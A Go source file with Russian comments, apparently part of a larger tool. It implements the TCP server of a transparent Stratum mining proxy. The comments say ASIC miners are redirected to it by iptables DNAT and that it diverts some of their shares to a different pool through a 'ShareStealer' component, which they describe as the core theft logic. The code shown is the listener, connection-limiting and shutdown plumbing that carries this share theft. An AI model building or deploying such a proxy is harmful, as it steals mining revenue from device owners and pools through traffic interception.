// Пакет proxy — сердце системы: TCP-сервер, обработка соединений и
// вся логика перехвата/перенаправления шар.
//
// Архитектурно это прозрачный Stratum-прокси:
//   ASIC -> (iptables DNAT) -> proxy server -> реальный пул (upstream)
//                                  |
//                                  +---> целевой пул (только «укушенные» шары)
// Каждое TCP-соединение обрабатывается в отдельной goroutine, поэтому
// прокси способен держать одновременно тысячи ASIC-устройств.
package proxy

import (
	"log"
	"net"
	"strings"
	"sync"
)

// maxConnections — жёсткий потолок одновременных соединений. Защита от
// атаки (произвольная нагрузка на accept-порт) и от перерасхода ресурсов.
// filler: при достижении лимита новые соединения сразу закрываются.
const maxConnections = 50000

// Server TCP прокси для майнинг-трафика.
// Содержит адрес слушающего порта, адрес upstream-пула и ссылку на
// ShareStealer (логику кражи). WaitGroup wg используется для корректного
// завершения: мы ждём все активные соединения при shutdown.
type Server struct {
	listenAddr  string         // адрес, где слушаем (0.0.0.0:8443)
	upstream    string         // адрес реального пула (viabtc.com:3333)
	upstreamSSL bool           // нужен ли TLS к реальному пулу
	stealer     *ShareStealer  // ядро логики кражи шар
	wg          sync.WaitGroup // счётчик активных соединений

	// closeOnce гарантирует, что listener закрывается ровно один раз.
	closeOnce sync.Once
	ln        net.Listener

	// semaphore — ограничение одновременных соединений (chan struct{}
	// ёмкостью maxConnections). Занятие слота — на время обработки сессии.
	sem chan struct{}
}

// NewServer создаёт новый прокси-сервер с заданными параметрами.
func NewServer(listenAddr, upstream string, upstreamSSL bool, stealer *ShareStealer) *Server {
	return &Server{
		listenAddr:  listenAddr,
		upstream:    upstream,
		upstreamSSL: upstreamSSL,
		stealer:     stealer,
		sem:         make(chan struct{}, maxConnections),
	}
}

// Run запускает TCP listener и обрабатывает входящие соединения.
// Работает в бесконечном accept loop. Для graceful shutdown main вызывает
// Shutdown(), который закрывает listener — accept возвращает ошибку
// ErrClosed и цикл завершается.
func (s *Server) Run() error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return err
	}
	s.ln = ln
	defer s.ln.Close()

	log.Printf("[LISTEN] mining proxy on %s -> %s (ssl=%v)", s.listenAddr, s.upstream, s.upstreamSSL)

	for {
		// Принимаем новое соединение от ASIC-майнера.
		conn, err := ln.Accept()
		if err != nil {
			// Listener закрыт через Shutdown() — выходим чисто.
			if isClosedErr(err) {
				log.Printf("[LISTEN] listener closed, accept loop exiting")
				return nil
			}
			log.Printf("[LISTEN] accept: %v", err)
			continue
		}

		// Лимит активных соединений: если слоты заняты — закрываем новое,
		// чтобы не перегрузить сервер. Занятие слота неблокирующее.
		select {
		case s.sem <- struct{}{}:
		default:
			log.Printf("[LISTEN] max connections reached, rejecting %s", conn.RemoteAddr())
			conn.Close()
			continue
		}

		// Каждое соединение обрабатываем в отдельной goroutine,
		// чтобы тысячи ASIC-ов обслуживались параллельно.
		s.wg.Add(1)
		go func(c net.Conn) {
			defer s.wg.Done()
			defer func() { <-s.sem }()
			HandleConnection(c, s.upstream, s.upstreamSSL, s.stealer)
		}(conn)
	}
}

// Shutdown корректно завершает работу сервера.
// Закрывает listener (accept-цикл завершится), затем ждёт завершения всех
// активных соединений (не роняя их на полуслове).
func (s *Server) Shutdown() {
	s.closeOnce.Do(func() {
		if s.ln != nil {
			s.ln.Close()
		}
	})
	s.wg.Wait()
}

// isClosedErr определяет, является ли ошибка accept результатом закрытия
// listener (нормальное завершение), а не сетевым сбоем.
// Go 1.13 не имеет net.ErrClosed, поэтому проверяем текст ошибки.
func isClosedErr(err error) bool {
	if err == nil {
		return false
	}
	return strings.Contains(err.Error(), "use of closed network connection")
}
